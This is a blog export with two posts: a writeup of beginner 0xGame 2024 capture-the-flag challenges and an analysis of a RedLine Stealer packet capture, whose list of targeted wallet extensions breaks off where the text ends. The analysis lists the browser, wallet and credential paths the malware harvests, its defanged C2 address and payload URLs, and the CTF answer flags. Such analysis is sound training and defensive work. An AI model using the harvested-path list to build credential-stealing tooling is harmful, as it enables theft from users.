<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>0xGame2024wp</title>
    <url>/posts/2fabe180.html</url>
    <content><![CDATA[<p>南邮的新生赛，<code>week1</code> 对于我这种老年痴呆来说还是能做一做。</p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Week-1-BabyBase"><a href="#Week-1-BabyBase" class="headerlink" title="[Week 1] BabyBase"></a>[Week 1] BabyBase</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picx.zhimg.com/80/v2-2f708b8cd2bf316adbb7c4f84d84f581.png"
                      alt="img"
                ></p>
<p>shift+f12 看看，base64，秒了，甚至都没换表</p>
<blockquote>
<p>0xGame{N0w_y0u_kn0w_B4se64_Enc0d1ng_w3ll!}</p>
</blockquote>
<h3 id="Week-1-BinaryMaster"><a href="#Week-1-BinaryMaster" class="headerlink" title="[Week 1] BinaryMaster"></a>[Week 1] BinaryMaster</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic1.zhimg.com/80/v2-d82e1c6c9baab8986d330683623d0fe6.png"
                      alt="img"
                ></p>
<p>flag 打开就有</p>
<blockquote>
<p>0xGame{114514cc-a3a7-4e36-8db1-5f224b776271}</p>
</blockquote>
<h3 id="Week-1-SignSign"><a href="#Week-1-SignSign" class="headerlink" title="[Week 1] SignSign"></a>[Week 1] SignSign</h3><p>查看字符串，打开就有</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic1.zhimg.com/80/v2-b5f0ffebdcc5866054c94e3c4f719ade.png"
                      alt="img"
                ></p>
<blockquote>
<p>0xGame{S1gn1n_h3r3_4nd_b3g1n_Reversing_n0w}</p>
</blockquote>
<h3 id="Week-1-Xor-Beginning"><a href="#Week-1-Xor-Beginning" class="headerlink" title="[Week 1] Xor-Beginning"></a>[Week 1] Xor-Beginning</h3><p>一个简单的异或</p>
<div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line">v5 = [<span class="number">0</span>] * <span class="number">30</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="string">&quot;~5\v*&#x27;,3&quot;</span>)):</span><br><span class="line">    v5[i] = <span class="built_in">ord</span>(<span class="string">&quot;~5\v*&#x27;,3&quot;</span>[i])</span><br><span class="line">v5[<span class="number">7</span>] = <span class="number">31</span></span><br><span class="line">v5[<span class="number">8</span>] = <span class="number">118</span></span><br><span class="line">v5[<span class="number">9</span>] = <span class="number">55</span></span><br><span class="line">v5[<span class="number">10</span>] = <span class="number">27</span></span><br><span class="line">v5[<span class="number">11</span>] = <span class="number">114</span></span><br><span class="line">v5[<span class="number">12</span>] = <span class="number">49</span></span><br><span class="line">v5[<span class="number">13</span>] = <span class="number">30</span></span><br><span class="line">v5[<span class="number">14</span>] = <span class="number">54</span></span><br><span class="line">v5[<span class="number">15</span>] = <span class="number">12</span></span><br><span class="line">v5[<span class="number">16</span>] = <span class="number">76</span></span><br><span class="line">v5[<span class="number">17</span>] = <span class="number">68</span></span><br><span class="line">v5[<span class="number">18</span>] = <span class="number">99</span></span><br><span class="line">v5[<span class="number">19</span>] = <span class="number">114</span></span><br><span class="line">v5[<span class="number">20</span>] = <span class="number">87</span></span><br><span class="line">v5[<span class="number">21</span>] = <span class="number">73</span></span><br><span class="line">v5[<span class="number">22</span>] = <span class="number">8</span></span><br><span class="line">v5[<span class="number">23</span>] = <span class="number">69</span></span><br><span class="line">v5[<span class="number">24</span>] = <span class="number">66</span></span><br><span class="line">v5[<span class="number">25</span>] = <span class="number">1</span></span><br><span class="line">v5[<span class="number">26</span>] = <span class="number">90</span></span><br><span class="line">v5[<span class="number">27</span>] = <span class="number">4</span></span><br><span class="line">v5[<span class="number">28</span>] = <span class="number">19</span></span><br><span class="line">v5[<span class="number">29</span>] = <span class="number">76</span></span><br><span class="line"><span class="built_in">print</span>(v5)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v5)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(v5[i] ^ (<span class="number">78</span> - i))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="Week-1-Xor-Endian"><a href="#Week-1-Xor-Endian" class="headerlink" title="[Week 1] Xor-Endian"></a>[Week 1] Xor-Endian</h3><p>这题也是异或，只不过用得到一些小端序的知识，用 ChatGPT 写的，等有时间再回来研究研究</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 v6 数组</span></span><br><span class="line">v6 = [</span><br><span class="line">    <span class="number">1363025275</span>,</span><br><span class="line">    <span class="number">253370901</span>,</span><br><span class="line">    <span class="number">1448151638</span>,</span><br><span class="line">    <span class="number">1415391232</span>,</span><br><span class="line">    <span class="number">91507463</span>,</span><br><span class="line">    <span class="number">139743552</span>,</span><br><span class="line">    <span class="number">1450318164</span>,</span><br><span class="line">    <span class="number">1985283101</span>,</span><br><span class="line">    <span class="number">1465125718</span>,</span><br><span class="line">    <span class="number">1934953223</span>,</span><br><span class="line">    <span class="number">84430593</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 v6 转换为字节序列（小端序）</span></span><br><span class="line">v6_bytes = <span class="string">b&quot;&quot;</span>.join(struct.pack(<span class="string">&quot;&lt;I&quot;</span>, num) <span class="keyword">for</span> num <span class="keyword">in</span> v6)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只取前 44 个字节</span></span><br><span class="line">v6_bytes = v6_bytes[:<span class="number">44</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义密钥</span></span><br><span class="line">key = <span class="string">b&quot;Key0xGame2024&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密长度</span></span><br><span class="line">encrypt_len = <span class="number">44</span></span><br><span class="line">key_len = <span class="built_in">len</span>(key)  <span class="comment"># 13</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 反向计算原始的 v7_bytes</span></span><br><span class="line">v7_bytes = <span class="built_in">bytearray</span>(encrypt_len)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(encrypt_len):</span><br><span class="line">    v7_bytes[i] = v6_bytes[i] ^ key[i % key_len]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;需要输入的字符串为：&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(v7_bytes.decode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Week-1-关注-DK-盾谢谢喵"><a href="#Week-1-关注-DK-盾谢谢喵" class="headerlink" title="[Week 1] 关注 DK 盾谢谢喵"></a>[Week 1] 关注 DK 盾谢谢喵</h3><p>签到题，不多说了</p>
<blockquote>
<p>0xGame{W31c0m3_70_0x64m3_2024_5p0n50r3d_8y_dkdun}</p>
</blockquote>
<h3 id="Week-1-加密的压缩包"><a href="#Week-1-加密的压缩包" class="headerlink" title="[Week 1] 加密的压缩包?"></a>[Week 1] 加密的压缩包?</h3><p>打开之后发现文件损坏，用 <code>bandzip</code> 修复也没成功</p>
<p>伪加密修复后可以正常解压，输入解压密码 <code>0xGame2024</code></p>
<p>拿到 flag</p>
<blockquote>
<p>0xGame{M@ybe_y0u_ar2_t4e_mAsTer_0f_Z1p}</p>
</blockquote>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Week-1-ez-login"><a href="#Week-1-ez-login" class="headerlink" title="[Week 1] ez_login"></a>[Week 1] ez_login</h3><p>弱口令</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">admin123</span><br></pre></td></tr></table></figure></div>

<h3 id="Week-1-hello-web"><a href="#Week-1-hello-web" class="headerlink" title="[Week 1] hello_web"></a>[Week 1] hello_web</h3><p>根据提示查看源代码</p>
<div class="code-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>查看源代码<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;contextmenu&quot;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="string">&quot;居心叵测，不许查看源代码！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        e.<span class="title function_">preventDefault</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125;);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;keydown&quot;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (e.<span class="property">key</span> === <span class="string">&quot;F12&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="title function_">alert</span>(<span class="string">&quot;你想干嘛？你不许F12！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">          e.<span class="title function_">preventDefault</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Welcome to 0xgame 2024<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 看看f14g.php --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 此乃flag的第一段：0xGame&#123;ee7f2040-1987-4e0a --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个简洁的网页，web方向的题基本都会有这么一个网站<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>零基础的同学不会的地方，可以尝试多搜索一下<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>拿到第一段</p>
<p>根据提示看&#x2F;f14g.php</p>
<p>查看响应包</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic1.zhimg.com/80/v2-1fefcec60e819ed72f95f44ee7fc8a5d.png"
                      alt="img"
                ></p>
<blockquote>
<p>0xGame{ee7f2040-1987-4e0a-872d-68589c4ab3d3}</p>
</blockquote>
<h3 id="Week-1-hello-http"><a href="#Week-1-hello-http" class="headerlink" title="[Week 1] hello_http"></a>[Week 1] hello_http</h3><p>考察 http 协议，用 hackerbar 打就行了，感谢哆啦 A 梦师哥的指导</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picx.zhimg.com/80/v2-884e32099bcaa4e1102268627161ac26.png"
                      alt="img"
                ></p>
<blockquote>
<p>0xgame{1cd6a904-725f-11ef-aafb-d4d8533ec05c}</p>
</blockquote>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Week-1-Caesar-Cipher"><a href="#Week-1-Caesar-Cipher" class="headerlink" title="[Week 1] Caesar Cipher"></a>[Week 1] Caesar Cipher</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0yHbnf&#123;Uif_Cfhjoojoh_Pg_Dszqup&#125;</span><br></pre></td></tr></table></figure></div>

<p>凯撒密码，枚举一下</p>
<blockquote>
<p>0xGame{The_Beginning_Of_Crypto}</p>
</blockquote>
<h3 id="Week-1-Code"><a href="#Week-1-Code" class="headerlink" title="[Week 1] Code"></a>[Week 1] Code</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的分块信息</span></span><br><span class="line">m0 = <span class="string">b&quot;0xGame&#123;73d7&quot;</span></span><br><span class="line">m1 = <span class="number">60928972245886112747629873</span></span><br><span class="line">m2 = <span class="string">&quot;3165662d393339332d3034&quot;</span></span><br><span class="line">m3 = <span class="string">b&quot;N2YwZTdjNGRlMX0=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 逆向解码</span></span><br><span class="line">m1_decoded = long_to_bytes(m1)</span><br><span class="line">m2_decoded = <span class="built_in">bytes</span>.fromhex(m2)</span><br><span class="line">m3_decoded = b64decode(m3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 组合得到完整的 flag</span></span><br><span class="line">flag = m0 + m1_decoded + m2_decoded + m3_decoded</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Week-1-0-test-your-nc"><a href="#Week-1-0-test-your-nc" class="headerlink" title="[Week 1] 0. test your nc"></a>[Week 1] 0. test your nc</h3><p>nc 连上拿到 flag，可能要连两次，第二次才有</p>
<blockquote>
<p>0xGame{928bb261-0a63-4389-b629-4d1f2f449848}</p>
</blockquote>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
        <category>0xGame2024</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
        <tag>0xGame2024</tag>
      </tags>
  </entry>
  <entry>
    <title>Crossing the Line Unit 42 Wireshark Quiz for RedLine Stealer</title>
    <url>/posts/dbf9c8f7.html</url>
    <content><![CDATA[<h1 id="Crossing-the-Line-Unit-42-Wireshark-Quiz-for-RedLine-Stealer"><a href="#Crossing-the-Line-Unit-42-Wireshark-Quiz-for-RedLine-Stealer" class="headerlink" title="Crossing the Line Unit 42 Wireshark Quiz for RedLine Stealer"></a>Crossing the Line Unit 42 Wireshark Quiz for RedLine Stealer</h1><h2 id="Quiz-Questions"><a href="#Quiz-Questions" class="headerlink" title="Quiz Questions"></a>Quiz Questions</h2><h3 id="What-is-the-date-and-time-in-UTC-the-infection-started"><a href="#What-is-the-date-and-time-in-UTC-the-infection-started" class="headerlink" title="What is the date and time in UTC the infection started?"></a>What is the date and time in UTC the infection started?</h3><ul>
<li>感染开始的 UTC 日期和时间是什么时候？</li>
<li>感染于 2023 年 7 月 10 日 22：39 UTC 开始。</li>
</ul>
<h3 id="What-is-the-IP-address-of-the-infected-Windows-client"><a href="#What-is-the-IP-address-of-the-infected-Windows-client" class="headerlink" title="What is the IP address of the infected Windows client?"></a>What is the IP address of the infected Windows client?</h3><ul>
<li>受感染的 Windows 客户端的 IP 地址是什么？</li>
<li>受感染的 Windows 客户端 IP 地址：10.7.10 [.] 47</li>
</ul>
<h3 id="What-is-the-MAC-address-of-the-infected-Windows-client"><a href="#What-is-the-MAC-address-of-the-infected-Windows-client" class="headerlink" title="What is the MAC address of the infected Windows client?"></a>What is the MAC address of the infected Windows client?</h3><ul>
<li>受感染的 Windows 客户端的 MAC 地址是什么？</li>
<li>受感染的 Windows 客户端 MAC 地址：80：86：5b：ab：1e：c4</li>
</ul>
<h3 id="What-is-the-hostname-of-the-infected-Windows-client"><a href="#What-is-the-hostname-of-the-infected-Windows-client" class="headerlink" title="What is the hostname of the infected Windows client?"></a>What is the hostname of the infected Windows client?</h3><ul>
<li>受感染的 Windows 客户端的主机名是什么？</li>
<li>受感染的 Windows 主机名：DESKTOP-9PEA63H</li>
</ul>
<h3 id="What-is-the-user-account-name-from-the-infected-Windows-host"><a href="#What-is-the-user-account-name-from-the-infected-Windows-host" class="headerlink" title="What is the user account name from the infected Windows host?"></a>What is the user account name from the infected Windows host?</h3><ul>
<li>受感染的 Windows 主机的用户帐户名称是什么？</li>
<li>受感染的 Windows 客户端 IP 用户帐户名称：rwalters</li>
</ul>
<h3 id="What-type-of-information-did-this-RedLine-Stealer-try-to-steal"><a href="#What-type-of-information-did-this-RedLine-Stealer-try-to-steal" class="headerlink" title="What type of information did this RedLine Stealer try to steal?"></a>What type of information did this RedLine Stealer try to steal?</h3><ul>
<li>这个 RedLine Stealer 试图窃取什么类型的信息？</li>
<li>RedLine 恶意软件试图窃取的信息：<ul>
<li>受害者桌面上的各种类型的文件</li>
<li>受害者的“文档”文件夹中的各种类型的文件</li>
<li>Chrome、Chromium、Edge、Opera、Vivaldi 和其他各种网络浏览器的用户数据</li>
<li>各种加密货币钱包的数据和这些加密货币钱包的浏览器插件</li>
<li>来自其他应用程序的 API 密钥和登录凭据</li>
</ul>
</li>
</ul>
<h2 id="Answer"><a href="#Answer" class="headerlink" title="Answer"></a>Answer</h2><h3 id="Pcap-分析：受害者详细信息"><a href="#Pcap-分析：受害者详细信息" class="headerlink" title="Pcap 分析：受害者详细信息"></a>Pcap 分析：受害者详细信息</h3><p><img src="/../images/Wireshark-sd/Crossing%20the%20Line%20Unit%2042%20Wireshark%20Quiz%20for%20RedLine%20Stealer/image-20240712095107113.png" alt="../images/Wireshark-sd/Crossing%20the%20Line%20Unit%2042%20Wireshark%20Quiz%20for%20RedLine%20Stealer/image-20240712095107113"></p>
<p>感染于 2023 年 7 月 10 日 22：39 UTC 开始。</p>
<p><img src="/../images/Wireshark-sd/Crossing%20the%20Line%20Unit%2042%20Wireshark%20Quiz%20for%20RedLine%20Stealer/image-20240712095823382.png" alt="../images/Wireshark-sd/Crossing%20the%20Line%20Unit%2042%20Wireshark%20Quiz%20for%20RedLine%20Stealer/image-20240712095823382"></p>
<p>确定受感染者的 IP 地址和 MAC 地址</p>
<p>通过筛选 nbns 确定受害者主机名</p>
<p><img src="/../images/Wireshark-sd/Crossing%20the%20Line%20Unit%2042%20Wireshark%20Quiz%20for%20RedLine%20Stealer/image-20240712100105392.png" alt="../images/Wireshark-sd/Crossing%20the%20Line%20Unit%2042%20Wireshark%20Quiz%20for%20RedLine%20Stealer/image-20240712100105392"></p>
<p><img src="/../images/Wireshark-sd/Crossing%20the%20Line%20Unit%2042%20Wireshark%20Quiz%20for%20RedLine%20Stealer/image-20240712100726654.png" alt="../images/Wireshark-sd/Crossing%20the%20Line%20Unit%2042%20Wireshark%20Quiz%20for%20RedLine%20Stealer/image-20240712100726654"></p>
<p>通过 Kerberos 身份验证流量验证受害者的主机名和 Windows 用户帐户名。筛选 kerberos.CNameString 查找 Windows 用户帐户名 rwalters</p>
<p><img src="/../images/Wireshark-sd/Crossing%20the%20Line%20Unit%2042%20Wireshark%20Quiz%20for%20RedLine%20Stealer/image-20240712100510846.png" alt="../images/Wireshark-sd/Crossing%20the%20Line%20Unit%2042%20Wireshark%20Quiz%20for%20RedLine%20Stealer/image-20240712100510846"></p>
<h3 id="Pcap-分析：恶意-Web-流量"><a href="#Pcap-分析：恶意-Web-流量" class="headerlink" title="Pcap 分析：恶意 Web 流量"></a>Pcap 分析：恶意 Web 流量</h3><p>利用 <code>(http.request or tls.handshake.type eq 1) and !(ssdp)</code> 过滤出 Web 流量</p>
<p>发现三个未加密的 HTTP GET 请求</p>
<p><img src="/../images/Wireshark-sd/Crossing%20the%20Line%20Unit%2042%20Wireshark%20Quiz%20for%20RedLine%20Stealer/image-20240712100949555.png" alt="../images/Wireshark-sd/Crossing%20the%20Line%20Unit%2042%20Wireshark%20Quiz%20for%20RedLine%20Stealer/image-20240712100949555"></p>
<p>追踪 623start [.] 的任一流量</p>
<p><img src="/../images/Wireshark-sd/Crossing%20the%20Line%20Unit%2042%20Wireshark%20Quiz%20for%20RedLine%20Stealer/image-20240712101143122.png" alt="../images/Wireshark-sd/Crossing%20the%20Line%20Unit%2042%20Wireshark%20Quiz%20for%20RedLine%20Stealer/image-20240712101143122"></p>
<p>TCP 流显示可能的 PowerShell 生成的流量。</p>
<p>虽然 User-Agent 字符串可能被恶意软件或 Web 浏览器扩展欺骗，但 User-Agent 行中的 WindowsPowerShell 是一个可靠的指示器，表明此流量是由 PowerShell 脚本生成的。这两个 HTTP GET 请求的 URL 是：</p>
<ul>
<li>hxxp:&#x2F;&#x2F;623start [.] site&#x2F;?status &#x3D; start&amp;av &#x3D; Windows%20Defender</li>
<li>hxxp:&#x2F;&#x2F;623start [.] site&#x2F;?status &#x3D; install</li>
</ul>
<p>这些请求都从服务器返回了 404 HTTP 错误。第一个 HTTP 请求报告了受害主机上使用的防病毒软件。在这种情况下，av &#x3D; Windows%20Defender 指示 Windows Defender 是防病毒软件。第二个 URL 报告此恶意软件的安装状态。</p>
<p>最后一个未加密的 HTTP GET 请求是 hxxp:&#x2F;&#x2F;guiatelefonos [.] com&#x2F;data&#x2F;czx.jpg 中。遵循此 GET 请求的 TCP 流。TCP 流显示此 URL 重定向到同一 URL 的 HTTPS 版本</p>
<p><img src="/../images/Wireshark-sd/Crossing%20the%20Line%20Unit%2042%20Wireshark%20Quiz%20for%20RedLine%20Stealer/image-20240712101437450.png" alt="../images/Wireshark-sd/Crossing%20the%20Line%20Unit%2042%20Wireshark%20Quiz%20for%20RedLine%20Stealer/image-20240712101437450"></p>
<p>http URL 到 guiatelefonos [.] com 重定向到 HTTPS URL。</p>
<p><code>hxxps://guiatelefonos [.] com/data/czx.jpg</code></p>
<h3 id="Pcap-分析：RedLine-Stealer-数据泄露"><a href="#Pcap-分析：RedLine-Stealer-数据泄露" class="headerlink" title="Pcap 分析：RedLine Stealer 数据泄露"></a>Pcap 分析：RedLine Stealer 数据泄露</h3><p>使用下面命令过滤</p>
<p><code>tcp.flags eq 0x0002 and !(tcp.port eq 443) and !(tcp.port eq 80) and !(ip.dst eq 10.7.10.0/24)</code></p>
<p>此筛选器搜索表示 TCP 流开头的 TCP SYN 段。搜索将排除通过 TCP 端口 80 和 TCP 端口 443 的任何 Web 流量。此筛选器还会排除从此 AD 环境发送到内部 IP 地址的任何 SYN 段。结果显示发送到 194.26.135 的单个 TCP SYN 段 [.] 119 通过 TCP 端口 12432</p>
<p><img src="/../images/Wireshark-sd/Crossing%20the%20Line%20Unit%2042%20Wireshark%20Quiz%20for%20RedLine%20Stealer/image-20240712101757863.png" alt="../images/Wireshark-sd/Crossing%20the%20Line%20Unit%2042%20Wireshark%20Quiz%20for%20RedLine%20Stealer/image-20240712101757863"></p>
<p>来自 TCP 流的初始字符串包括 tcp:&#x2F;&#x2F;194.26.135 [.] 处的 C2 通道。119：12432&#x2F; 和使用 tempuri [.] 的 URL 组织。术语“tempuri”是“临时 URI”的缩写，域 tempuri [.] org 是 Microsoft 开发工具（如 Visual Studio）中使用的占位符命名空间 URI。在我们的 RedLine Stealer 感染的任何其他流量中均未看到此 tempuri 域。</p>
<p>选择从服务器发送到受感染的 Windows 主机的数据</p>
<p><img src="/../images/Wireshark-sd/Crossing%20the%20Line%20Unit%2042%20Wireshark%20Quiz%20for%20RedLine%20Stealer/image-20240712102141393.png" alt="../images/Wireshark-sd/Crossing%20the%20Line%20Unit%2042%20Wireshark%20Quiz%20for%20RedLine%20Stealer/image-20240712102141393"></p>
<p>下图突出显示了这种感染在受害者的用户配置文件下寻找的数据。</p>
<p><img src="/../images/Wireshark-sd/Crossing%20the%20Line%20Unit%2042%20Wireshark%20Quiz%20for%20RedLine%20Stealer/image-20240712104612459.png" alt="../images/Wireshark-sd/Crossing%20the%20Line%20Unit%2042%20Wireshark%20Quiz%20for%20RedLine%20Stealer/image-20240712104612459"></p>
<p>该列表包括受害者桌面和受害者的“文档”文件夹上的通配符搜索。这包括文本文件、Word 文档和加密货币钱包文件，如下所示。</p>
<ul>
<li>%userprofile%\Desktop|<em>.txt，</em>.doc <em>，</em> key <em>，</em> wallet <em>，</em> seed*|0</li>
<li>%userprofile%\Documents|<em>.txt，</em>.doc <em>，</em> key <em>，</em> wallet <em>，</em> seed*|0</li>
</ul>
<p>然后，该列表根据受害者在其用户配置文件中受害者的 AppData 目录下的预期位置指示来自不同应用程序的数据。该列表按字母顺序显示在下面。</p>
<ul>
<li>%USERPROFILE%\AppData\Local\360Browser\Browser\User Data</li>
<li>%USERPROFILE%\AppData\Local\7Star\7Star\User Data</li>
<li>%USERPROFILE%\AppData\Local\Amigo\User\User Data</li>
<li>%USERPROFILE%\AppData\Local\Battle.net</li>
<li>%USERPROFILE%\AppData\Local\BraveSoftware\Brave-Browser\User Data</li>
<li>%USERPROFILE%\AppData\Local\CatalinaGroup\Citrio\User Data</li>
<li>%USERPROFILE%\AppData\Local\CentBrowser\User Data</li>
<li>%USERPROFILE%\AppData\Local\Chedot\User Data</li>
<li>%USERPROFILE%\AppData\Local\Chromium\User Data</li>
<li>%USERPROFILE%\AppData\Local\Chromodo\User Data</li>
<li>%USERPROFILE%\AppData\Local\CocCoc\Browser\User Data</li>
<li>%USERPROFILE%\AppData\Local\Comodo\Dragon\User Data</li>
<li>%USERPROFILE%\AppData\Local\Comodo\User Data</li>
<li>%USERPROFILE%\AppData\Local\Coowon\Coowon\User Data</li>
<li>%USERPROFILE%\AppData\Local\CryptoTab Browser\User Data</li>
<li>%USERPROFILE%\AppData\Local\Elements Browser\User Data</li>
<li>%USERPROFILE%\AppData\Local\Epic Privacy Browser\User Data</li>
<li>%USERPROFILE%\AppData\Local\Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer</li>
<li>%USERPROFILE%\AppData\Local\Google(x86)\Chrome\User Data</li>
<li>%USERPROFILE%\AppData\Local\Google\Chrome\User Data</li>
<li>%USERPROFILE%\AppData\Local\Iridium\User Data</li>
<li>%USERPROFILE%\AppData\Local\K-Melon\User Data</li>
<li>%USERPROFILE%\AppData\Local\Kometa\User Data</li>
<li>%USERPROFILE%\AppData\Local\liebao\User Data</li>
<li>%USERPROFILE%\AppData\Local\Mail.Ru\Atom\User Data</li>
<li>%USERPROFILE%\AppData\Local\MapleStudio\ChromePlus\User Data</li>
<li>%USERPROFILE%\AppData\Local\Maxthon3\User Data</li>
<li>%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data</li>
<li>%USERPROFILE%\AppData\Local\Nichrome\User Data</li>
<li>%USERPROFILE%\AppData\Local\NVIDIA Corporation\NVIDIA GeForce Experience</li>
<li>%USERPROFILE%\AppData\Local\Orbitum\User Data</li>
<li>%USERPROFILE%\AppData\Local\QIP Surf\User Data</li>
<li>%USERPROFILE%\AppData\Local\Sputnik\Sputnik\User Data</li>
<li>%USERPROFILE%\AppData\Local\Steam</li>
<li>%USERPROFILE%\AppData\Local\Torch\User Data</li>
<li>%USERPROFILE%\AppData\Local\uCozMedia\Uran\User Data</li>
<li>%USERPROFILE%\AppData\Local\Uran\User Data</li>
<li>%USERPROFILE%\AppData\Local\Vivaldi\User Data</li>
<li>%USERPROFILE%\AppData\Local\Yandex\YandexBrowser\User Data</li>
<li>%USERPROFILE%\AppData\Roaming\8pecxstudios\Cyberfox</li>
<li>%USERPROFILE%\AppData\Roaming\Comodo\IceDragon</li>
<li>%USERPROFILE%\AppData\Roaming\K-Meleon</li>
<li>%USERPROFILE%\AppData\Roaming\Moonchild Productions\Pale Moon</li>
<li>%USERPROFILE%\AppData\Roaming\Mozilla\Firefox</li>
<li>%USERPROFILE%\AppData\Roaming\NETGATE Technologies\BlackHaw</li>
<li>%USERPROFILE%\AppData\Roaming\Opera Software\</li>
<li>%USERPROFILE%\AppData\Roaming\Thunderbird</li>
<li>%USERPROFILE%\AppData\Roaming\Waterfox</li>
</ul>
<p>再往下滚动一点，我们发现似乎是这种感染寻找的各种加密货币钱包，如下图 11 所示。这些数据包括基于 Chromium 的 Web 浏览器（如 Google Chrome 和 Microsoft Edge）使用的扩展程序的标识符。</p>
<p><img src="/../images/Wireshark-sd/Crossing%20the%20Line%20Unit%2042%20Wireshark%20Quiz%20for%20RedLine%20Stealer/image-20240712104721040.png" alt="../images/Wireshark-sd/Crossing%20the%20Line%20Unit%2042%20Wireshark%20Quiz%20for%20RedLine%20Stealer/image-20240712104721040"></p>
<p>下面列出了这些加密货币钱包浏览器扩展，按钱包名称的字母顺序排序。（阅读：基于 Chromium 的扩展字符串|扩展名称。</p>
<ul>
<li>fhilaheimglignddkjgofkcbgekhenbh|AtomicWallet</li>
<li>fhbohimaelbohpjbbldcngcnapndodjp|BinanceChain</li>
<li>fihkakfobkmkjojpchpfgcmhfjnmnfpi|BitAppWallet</li>
